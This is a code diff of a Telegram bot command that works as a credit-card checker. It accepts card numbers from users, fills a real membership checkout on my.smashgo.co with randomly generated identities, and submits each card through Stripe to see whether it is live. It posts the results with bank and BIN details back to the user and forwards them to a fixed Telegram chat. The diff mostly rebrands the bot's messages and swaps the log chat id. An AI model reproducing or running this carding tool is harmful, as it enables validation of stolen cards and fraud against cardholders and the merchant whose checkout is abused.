@@ -6,7 +6,6 @@ from values import *
 from pyrogram import Client, filters
 import json
 
-
 headers = {
     "authority": "my.smashgo.co",
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/",
@@ -25,18 +24,16 @@ async def ca(Client, message):
     try:
         started_time = time.time()
         banned_bins = open('files/bannedbin.txt', 'r').readlines()
-        verified_gps = open('files/groups.txt', 'r').readlines()
-        
+        verified_gps = open('files/groups.txt', 'r').readlines()        
         if (str(message.chat.id) + "\n" not in verified_gps and message.chat.type != "private"):
             await message.reply_text(text= group_not_allowed,reply_to_message_id=message.message_id)
         else:
             text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-<b>●</b> Process: <b>□□□□□□□□□□ 0% </b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
-
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
             msg = await message.reply_text(text=text,reply_to_message_id=message.message_id)
             await Client.send_chat_action(message.chat.id, "typing")
             find = maindb.find_one({"_id": message.from_user.id})
@@ -50,10 +47,10 @@ async def ca(Client, message):
                 role = find["status"]
                 if role == "P" and spam_time < 10:
                     time_left = 10 - spam_time
-                    await msg.edit_text(f"""⚠️<b>AntiSpam {time_left}'s</b>⚠️""")
+                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                 elif role == "F" and spam_time < 60:
                     time_left =  60 - spam_time
-                    await msg.edit_text(f"""⚠️<b>AntiSpam {time_left}'s</b>⚠️""")
+                    await msg.edit_text(f"""<b> AntiSpam try again after {time_left}'s</b>""")
                 else:
                     if message.reply_to_message is not None:
                         message.text = message.reply_to_message.text
@@ -110,6 +107,10 @@ async def ca(Client, message):
                                 # phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
                                 first_name = random_data['results'][0]['name']['first']
                                 last_name = random_data['results'][0]['name']['last']
+                                # street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
+                                # city = random_data['results'][0]['location']['city']
+                                # state = random_data['results'][0]['location']['state']
+                                # zip = random_data['results'][0]['location']['postcode']
                                 email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
                                 password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))
                                 data = {
@@ -130,59 +131,51 @@ async def ca(Client, message):
                                 json_first = json.loads(res.text)
                                 if 'error' in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>REJECTED❌ [Incorrect Card]</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
-
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>REJECTED❌ [Error]</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
-
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>REJECTED❌ [ERROR]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 else:
                                     id = json_first["id"]
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Process: <b>■■■■■□□□□□ 50%</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> Time Taken: {get_time_taken(started_time)}'s
-
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     data = f"level=8&levelstodel=&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&first_name={first_name}&last_name={last_name}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear=ano"
                                     res = curl.post("https://my.smashgo.co/account/membership-checkout/?level=8",headers=headers,data=data)
                                     text = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Process: <b>■■■■■■■■■■ 100%</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> Time Taken: <b>{get_time_taken(started_time)}'s</b>
-
-<b>●</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     try:
                                         if 'incorrect_zip' in res.text or 'Your card zip code is incorrect.' in res.text or 'The zip code you supplied failed validation' in res.text or 'card zip code is incorrect' in res.text: 
@@ -252,21 +245,19 @@ async def ca(Client, message):
                                         await Client.send_message(chat_id=loggp, text=e)
                                     else:
                                         if response is None:
-                                            await msg.edit_text("✖️ PROXY DEAD ✖️")
+                                            await msg.edit_text("PROXY DEAD PLEASE REPORT TO OWNER @MrItzMe")
                                         else:
                                             lasttext = f"""
-<b>〄</b> GATE: <b>STRIPE AUTH [ch]</b>
-
-<b>●</b> Card: <code>{lista}</code>
-<b>●</b> Result: <b>{response}{r_logo} [{r_text}]</b>
-<b>●</b> Bank Info: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>●</b> Bin Info: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>●</b> TIME TAKEN: {get_time_taken(started_time)}'s
-
-<b>●</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>●</b> POWERED BY: <b><a href="t.me/SPA4KY">S P A R K Y</a></b>"""
+<b>〄</b> GATE: <b>STRIPE FREE [1]</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKEN: {get_time_taken(started_time)}'s
+<b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
+<b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                         await msg.edit_text(lasttext)
-                                        await Client.send_message(-1001752921824, lasttext)
+                                        await Client.send_message(-1001513565895, lasttext)
                                         antidb.set(message.from_user.id, int(time.time()))
     
     except Exception as e:
